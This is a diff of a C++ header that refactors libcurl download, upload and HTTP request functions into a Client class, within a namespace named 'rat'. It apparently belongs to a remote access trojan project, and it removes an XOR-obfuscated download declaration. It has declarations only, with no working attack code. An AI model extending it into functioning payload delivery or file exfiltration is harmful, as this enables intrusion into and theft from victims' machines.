@@ -7,57 +7,68 @@
 #include <cstdlib>
 #include <chrono>
 #include <filesystem>
+#include <cstdint>
 #include <curl/curl.h>
 
 namespace rat::networking {
 
-enum class NetworkingResponseStatus {
-    FILE_CREATION_FAILURE,
-    INVALID_URL,
-    CONNECTION_FAILURE,
-    UNKNOWN_FAILURE,
-    SUCCESS
-};
-
-struct NetworkingResponse {
-    NetworkingResponseStatus status;
-    std::chrono::milliseconds duration;
-};
-
 std::filesystem::path _getFilePathFromUrl(const std::string& arg_Url);
 
-// === Public API ===
-/*takes a url downloads the file to the file path, straight forward*/
-NetworkingResponse downloadFile(const std::string& arg_Url,
-                                 const std::filesystem::path& File_Path);
+struct BufferContext {
+    char*  buffer;     // pointer to fixed-size buffer
+    size_t capacity;   // total size available
+    size_t size;       // number of bytes written
+};
 
-/*takes a file path uploads to the url given, straight forward*/
-NetworkingResponse uploadFile(const std::filesystem::path& File_Path,
-                               const std::string& arg_Url);
+struct EasyCurlHandler {
+    CURL*    curl;
+    CURLcode state;
 
-/*Uploads mime file types*/
-NetworkingResponse uploadMimeFile(const std::filesystem::path& File_Path,
-                                  const std::string& arg_Url,
-                                  const std::string& Field_Name,
-                                  const std::string& Mime_Type = "") ;
+    EasyCurlHandler();                           // Constructor
+    ~EasyCurlHandler();                          // Destructor
 
-/*Uploads the mime file as raw bytes*/
-NetworkingResponse uploadMimeRawBytes(const uint8_t* p_Raw_Bytes, 
-                                  const size_t Data_Size, 
-                                  const std::string& arg_Url, 
-                                  const std::string& Mime_Type = "" );
+    // Type-safe setOption overloads
+    CURLcode setOption(CURLoption Curl_Option, long value);
+    CURLcode setOption(CURLoption Curl_Option, const char* value);
+    CURLcode setOption(CURLoption Curl_Option, void* value);
+    
+    /*
+    CURLcode setOption(CURLoption Curl_Option, curl_off_t value);
+    since curl_off_t is a typedef of long, there is no need to overload it.
+    */
+    CURLcode setUrl(const std::string& arg_Url);
 
+    using WriteCallback = size_t(*)(void*, size_t, size_t, void*);
+    CURLcode setWriteCallBackFunction(WriteCallback Call_Back);
 
-/*returns an empty {} vector when the request fails */
-std::vector<char> sendHttpRequest(const std::string& arg_Url);
+    CURLcode perform();                          // Perform the request
+    void reset();
+};
 
-/*Returns the actual bytes written into the buffer, rights into the buffer, */
-size_t sendHttpRequest(const std::string& arg_Url, char* Response_Buffer, size_t Response_Buffer_Size);
+class Client : public EasyCurlHandler {          // Explicit public inheritance
+private:
+    std::chrono::milliseconds action_duration{0};
 
-bool downloadData(const std::string& arg_Url, std::vector<uint8_t>& Out_Buffer);
+public:
+    bool download(const std::string& Downloading_Url, const std::filesystem::path& File_Path);
 
-bool downloadDataIntoBuffer(const std::string& arg_Url, std::vector<uint8_t> Data_Vector);
-bool downloadDataObfuscatedWithXor(const std::string& arg_Url,
-                                   std::vector<uint8_t>& Out_Buffer,
-                                   const char* Xor_Key);
+    /* Overloaded: extracts the file name from url and downloads to the current directory */
+    bool download(const std::string& Download_Url);
+
+    bool upload(const std::filesystem::path& File_Path, const std::string& Uploading_Url);
+
+    bool uploadMimeFile(const std::filesystem::path& File_Path,
+                        const std::string& arg_Url,
+                        const std::string& Field_Name,
+                        const std::string& Mime_Type = "");
+
+    std::vector<char> sendHttpRequest(const std::string& arg_Url);
+
+    /* Returns the actual bytes written into p_Buffer (truncates if response > Buffer_Size) */
+    size_t sendHttpRequest(const std::string& arg_Url, char* p_Buffer, size_t Buffer_Size);
+
+    bool downloadData(const std::string& arg_Url, std::vector<uint8_t>& Out_Buffer);
+};
+
 } // namespace rat::networking
+
